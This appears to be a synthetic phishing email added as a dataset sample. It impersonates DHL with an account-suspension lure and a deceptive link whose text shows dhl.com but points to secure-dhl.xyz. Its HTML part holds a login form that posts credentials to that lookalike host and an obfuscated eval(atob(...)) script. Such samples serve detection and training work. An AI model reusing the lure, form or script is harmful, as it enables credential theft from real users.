@@ -1,0 +1,34 @@
+From: notice@secure-dhl.xyz
+To: victim50@example.com
+Subject: Your account has been suspended - immediate action required
+Date: Tue, 18 Mar 2002 01:04:00 -0500
+Message-ID: <phish-170-13b2c696-840d-4aff-bb45-51135e986295@secure-dhl.xyz>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 06 Mar 2002 08:05:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 20 Mar 2002 03:10:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 14 Mar 2002 17:46:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 04 Mar 2002 23:54:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 20 Mar 2002 02:33:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 17 Mar 2002 10:44:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 04 Mar 2002 04:06:00 -0500
+Return-Path: <bounce@mail-8244a2bd.top>
+Reply-To: recovery0@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-8244a2bd.top; dkim=fail header.d=secure-dhl.xyz; dmarc=fail header.from=secure-dhl.xyz
+Received-SPF: fail (mx.example.com: domain of notice@secure-dhl.xyz does not designate 192.0.2.44 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=secure-dhl.xyz; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-170-e65a591"
+
+--bnd-p-170-e65a591
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://secure-dhl.xyz/login
+
+Reference: PD6CF8A
+--bnd-p-170-e65a591
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://secure-dhl.xyz/login<br/><br/>Reference: PD6CF8A</p><p><a href="http://secure-dhl.xyz/login">https://www.dhl.com/signin</a></p><form action="http://secure-dhl.xyz/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-170-e65a591--
